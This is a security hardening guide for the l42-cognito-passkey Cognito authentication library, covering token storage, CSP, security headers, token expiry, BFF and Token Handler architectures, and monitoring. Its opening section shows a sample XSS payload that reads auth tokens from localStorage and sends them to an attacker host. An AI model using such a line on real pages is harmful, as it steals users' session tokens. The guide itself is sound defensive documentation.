# Security Hardening Guide

This guide covers security mitigations for l42-cognito-passkey, organized by threat model.

## Token Storage Risk Assessment

> **Recommended:** Use handler mode (`tokenStorage: 'handler'`) for all production deployments. `localStorage` and `memory` modes are deprecated (removed in v1.0).

### The Risk (localStorage mode — deprecated)

Tokens stored in localStorage are accessible to any JavaScript running on the page:

```javascript
// Attacker-injected code (via XSS)
const token = localStorage.getItem('l42_auth_tokens');
fetch('https://attacker.com/steal', { body: token });
```

Handler mode eliminates this risk entirely — tokens never appear in JavaScript-accessible storage.

### Real-World Impact

| Incident | Year | Vector | Impact |
|----------|------|--------|--------|
| Drift OAuth Token Theft | 2025 | Supply chain compromise | 700+ orgs, MFA bypassed |
| jQuery XSS (CVE-2020-11022) | 2020 | Third-party library | Millions of sites vulnerable |
| ua-parser-js Supply Chain | 2021 | Compromised npm package | 7M weekly downloads affected |

### Risk by Application Type

| Application Type | Recommended Approach |
|-----------------|----------------------|
| All production apps | Token Handler mode (HttpOnly cookies) |
| Prototyping only | localStorage (deprecated) |

---

## Defense Layer 1: Content Security Policy (CSP)

### Why CSP Alone Is Insufficient

`script-src 'self'` can be bypassed via:
- JSONP endpoints on your domain
- Whitelisted CDN gadgets
- Base tag injection

**CSP is defense-in-depth, not a complete solution.**

### Recommended CSP Configuration

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  script-src-attr 'none';
  style-src 'nonce-{RANDOM}';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self'
    https://*.auth.*.amazoncognito.com
    https://cognito-idp.*.amazonaws.com;
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'none';
  upgrade-insecure-requests
```

### Implementing CSP with Nonces

**Server (Node.js/Express):**

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('base64');
    res.locals.nonce = nonce;

    res.setHeader('Content-Security-Policy', `
        script-src 'nonce-${nonce}' 'strict-dynamic';
        style-src 'nonce-${nonce}';
        default-src 'none';
        connect-src 'self' https://*.amazoncognito.com;
        img-src 'self' data:;
        base-uri 'none';
        object-src 'none';
    `.replace(/\s+/g, ' ').trim());

    next();
});
```

**HTML Template:**

```html
<script nonce="<%= nonce %>">
    window.L42_AUTH_CONFIG = {
        clientId: 'your-client-id',
        domain: 'your-app.auth.us-west-2.amazoncognito.com'
    };
</script>
<script nonce="<%= nonce %>" type="module" src="/auth/auth.js"></script>
```

---

## Defense Layer 2: Security Headers

Add these headers alongside CSP:

```
# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Prevent framing (clickjacking)
X-Frame-Options: DENY

# Origin isolation (prevents window.opener attacks)
Cross-Origin-Opener-Policy: same-origin

# HTTPS enforcement
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Referrer policy
Referrer-Policy: strict-origin-when-cross-origin
```

**Express middleware:**

```javascript
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    next();
});
```

---

## Defense Layer 3: Token Lifecycle Management

### Short Token Expiry

Configure Cognito for short-lived access tokens:

```python
# Cognito User Pool Client configuration
client.update_user_pool_client(
    UserPoolId='YOUR_POOL_ID',
    ClientId='YOUR_CLIENT_ID',
    AccessTokenValidity=15,      # 15 minutes
    IdTokenValidity=15,          # 15 minutes
    RefreshTokenValidity=7,      # 7 days
    TokenValidityUnits={
        'AccessToken': 'minutes',
        'IdToken': 'minutes',
        'RefreshToken': 'days'
    }
)
```

### Automatic Token Refresh

```javascript
import { ensureValidTokens, onLogout } from '/auth/auth.js';

// Refresh tokens before API calls
async function authenticatedFetch(url, options = {}) {
    const tokens = await ensureValidTokens();
    if (!tokens) {
        throw new Error('Not authenticated');
    }

    return fetch(url, {
        ...options,
        headers: {
            ...options.headers,
            'Authorization': `Bearer ${tokens.access_token}`
        }
    });
}

// Handle refresh failures
onLogout(() => {
    // Redirect to login when tokens can't be refreshed
    window.location.href = '/login';
});
```

---

## Architecture: Backend for Frontend (BFF)

A BFF (Backend for Frontend) is a broad pattern — a thin backend layer between your browser and your APIs. A **Token Handler** is a specific kind of BFF focused on managing OAuth tokens server-side.

This library's handler mode is a Token Handler. See [handler-mode.md](handler-mode.md#bff-vs-token-handler--whats-the-difference) for a detailed comparison.

**Recommended for all production applications.**

### How BFF Protects Tokens

```
┌─────────────┐
│   Browser   │  Only has: HttpOnly session cookie
│    (SPA)    │  No JavaScript access to tokens
└──────┬──────┘
       │
┌──────▼──────────────────┐
│ Backend for Frontend     │  Stores: Access + Refresh tokens
│ (your server)            │  Handles: OAuth flow, token refresh
└──────┬──────────────────┘
       │
┌──────▼──────────────────┐
│ Cognito / Resource API   │
└─────────────────────────┘
```

### BFF Implementation (Node.js)

```javascript
const express = require('express');
const session = require('express-session');
const axios = require('axios');

const app = express();

// Session with HttpOnly cookie
app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // No JavaScript access
        sameSite: 'strict',// CSRF protection
        maxAge: 3600000    // 1 hour
    },
    resave: false,
    saveUninitialized: false
}));

// OAuth callback - store tokens server-side
app.get('/auth/callback', async (req, res) => {
    const { code, state } = req.query;

    // Verify state (CSRF protection)
    if (state !== req.session.oauthState) {
        return res.status(400).send('Invalid state');
    }

    // Exchange code for tokens (server-to-server)
    const tokenResponse = await axios.post(
        `https://${process.env.COGNITO_DOMAIN}/oauth2/token`,
        new URLSearchParams({
            grant_type: 'authorization_code',
            client_id: process.env.COGNITO_CLIENT_ID,
            client_secret: process.env.COGNITO_CLIENT_SECRET,
            code,
            redirect_uri: process.env.REDIRECT_URI
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    // Store tokens in session (server-side only)
    req.session.accessToken = tokenResponse.data.access_token;
    req.session.refreshToken = tokenResponse.data.refresh_token;
    req.session.tokenExpiry = Date.now() + (tokenResponse.data.expires_in * 1000);

    // Browser only gets session cookie
    res.redirect('/');
});

// API proxy - add token to requests
app.use('/api', async (req, res, next) => {
    if (!req.session.accessToken) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    // Refresh if needed
    if (Date.now() > req.session.tokenExpiry - 60000) {
        await refreshTokens(req);
    }

    // Proxy request with token
    try {
        const response = await axios({
            method: req.method,
            url: `${process.env.API_BASE_URL}${req.path}`,
            headers: {
                'Authorization': `Bearer ${req.session.accessToken}`,
                'Content-Type': req.headers['content-type']
            },
            data: req.body
        });
        res.json(response.data);
    } catch (error) {
        res.status(error.response?.status || 500).json(error.response?.data);
    }
});

async function refreshTokens(req) {
    const response = await axios.post(
        `https://${process.env.COGNITO_DOMAIN}/oauth2/token`,
        new URLSearchParams({
            grant_type: 'refresh_token',
            client_id: process.env.COGNITO_CLIENT_ID,
            refresh_token: req.session.refreshToken
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    req.session.accessToken = response.data.access_token;
    req.session.tokenExpiry = Date.now() + (response.data.expires_in * 1000);
}
```

### SPA Changes for BFF

```javascript
// Instead of using l42-cognito-passkey directly,
// make API calls through your BFF:

async function fetchData() {
    const response = await fetch('/api/data', {
        credentials: 'include'  // Include session cookie
    });

    if (response.status === 401) {
        window.location.href = '/login';
        return;
    }

    return response.json();
}

// Login redirects to BFF
function login() {
    window.location.href = '/auth/login';
}

// Logout clears server session
async function logout() {
    await fetch('/auth/logout', { method: 'POST', credentials: 'include' });
    window.location.href = '/';
}
```

---

## Architecture: Token Handler Pattern

The Token Handler pattern is a **specific type of BFF** focused on token management. It's lighter than a full BFF because the browser still makes API calls directly — it just gets tokens from the backend instead of storing them locally.

This is what l42-cognito-passkey's handler mode implements. The example below shows the core idea:

```javascript
// Token Handler - backend manages tokens, browser gets them on demand
app.get('/auth/token', (req, res) => {
    if (!req.session.accessToken) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    // Return token for SPA to use directly
    // Token stays in memory only (not localStorage)
    res.json({
        accessToken: req.session.accessToken,
        expiresAt: req.session.tokenExpiry
    });
});

// SPA keeps token in memory
let cachedToken = null;
let tokenExpiry = 0;

async function getToken() {
    if (cachedToken && Date.now() < tokenExpiry - 60000) {
        return cachedToken;
    }

    const response = await fetch('/auth/token', { credentials: 'include' });
    if (!response.ok) {
        throw new Error('Not authenticated');
    }

    const data = await response.json();
    cachedToken = data.accessToken;
    tokenExpiry = data.expiresAt;

    return cachedToken;
}

// API calls use in-memory token
async function apiCall(endpoint) {
    const token = await getToken();
    return fetch(endpoint, {
        headers: { 'Authorization': `Bearer ${token}` }
    });
}
```

---

## Architecture: Web Worker Token Isolation

For SPAs without backend infrastructure.

```javascript
// token-worker.js (Web Worker)
let accessToken = null;
let refreshToken = null;

self.onmessage = async (event) => {
    switch (event.data.action) {
        case 'setTokens':
            accessToken = event.data.accessToken;
            refreshToken = event.data.refreshToken;
            break;

        case 'getToken':
            // Token only accessible to worker
            self.postMessage({ token: accessToken });
            break;

        case 'clear':
            accessToken = null;
            refreshToken = null;
            break;
    }
};
```

```javascript
// main.js (main thread)
const worker = new Worker('token-worker.js');

// After login, send tokens to worker
function storeTokensSecurely(tokens) {
    worker.postMessage({
        action: 'setTokens',
        accessToken: tokens.access_token,
        refreshToken: tokens.refresh_token
    });
    // Don't store in localStorage
}

// API calls request token from worker
async function secureApiCall(endpoint) {
    return new Promise((resolve) => {
        worker.onmessage = (event) => {
            fetch(endpoint, {
                headers: { 'Authorization': `Bearer ${event.data.token}` }
            }).then(resolve);
        };
        worker.postMessage({ action: 'getToken' });
    });
}
```

**Limitation:** Page reload loses tokens (no persistence).

---

## Future: DPoP (Demonstrating Proof-of-Possession)

DPoP binds tokens to a client keypair, making stolen tokens useless.

**Status:** AWS Cognito does not yet support DPoP (as of 2025). Monitor for updates.

```javascript
// Future implementation when Cognito supports DPoP
async function makeDPopRequest(url, method = 'GET') {
    const proof = await createDPopProof(url, method);

    return fetch(url, {
        method,
        headers: {
            'Authorization': `DPoP ${accessToken}`,
            'DPoP': proof
        }
    });
}
```

---

## Monitoring and Detection

### Log Suspicious Token Usage

```javascript
// Server-side token validation
function validateTokenUsage(req, token) {
    const claims = decodeToken(token);

    // Detect impossible travel
    const lastIP = getLastKnownIP(claims.sub);
    const currentIP = req.ip;
    const timeSinceLastRequest = Date.now() - getLastRequestTime(claims.sub);

    if (lastIP !== currentIP && timeSinceLastRequest < 60000) {
        logSecurityEvent({
            type: 'suspicious_token_usage',
            userId: claims.sub,
            reason: 'impossible_travel',
            lastIP,
            currentIP,
            timeDelta: timeSinceLastRequest
        });

        // Consider revoking token
        return false;
    }

    return true;
}
```

### OCSF Security Logging

Enable OCSF logging to detect anomalies:

```javascript
configure({
    clientId: 'xxx',
    cognitoDomain: 'xxx.auth.region.amazoncognito.com',
    securityLogger: (event) => {
        // Send to Security Lake / SIEM
        fetch('/api/security-logs', {
            method: 'POST',
            body: JSON.stringify(event)
        });
    }
});
```

---

## Checklist by Risk Level

### Low Risk (Internal Tools)

- [x] Enable HTTPS everywhere
- [x] Implement strict CSP with nonces
- [x] Add security headers
- [x] Configure short token expiry (15-30 min)
- [x] Enable OCSF logging
- [ ] Regular dependency audits

### Medium Risk (Public SPA)

All of the above, plus:
- [ ] Migrate to Token Handler mode (this library's handler mode)
- [ ] Remove unnecessary third-party scripts
- [ ] Implement token usage monitoring
- [ ] Add impossible travel detection

### High Risk (Healthcare/Finance)

All of the above, plus:
- [ ] Implement full BFF with API proxy (beyond Token Handler)
- [ ] Add DPoP when available
- [ ] Implement session binding
- [ ] Regular penetration testing
- [ ] SOC monitoring for token anomalies

---

## Summary

| Defense | Protects Against | Implementation Effort |
|---------|------------------|----------------------|
| CSP with nonces | Basic XSS | Low |
| Security headers | Various attacks | Low |
| Short token expiry | Token theft impact | Low |
| Token Handler (this library) | XSS token theft | Medium |
| Full BFF (API proxy) | XSS token theft + API abuse | High |
| DPoP | All token theft | Medium (when available) |

**The key insight:** No client-side token storage is fully secure against XSS. This library's Token Handler mode (a type of BFF) eliminates token theft from storage. For the highest-risk applications, a full BFF that also proxies API calls provides additional protection.
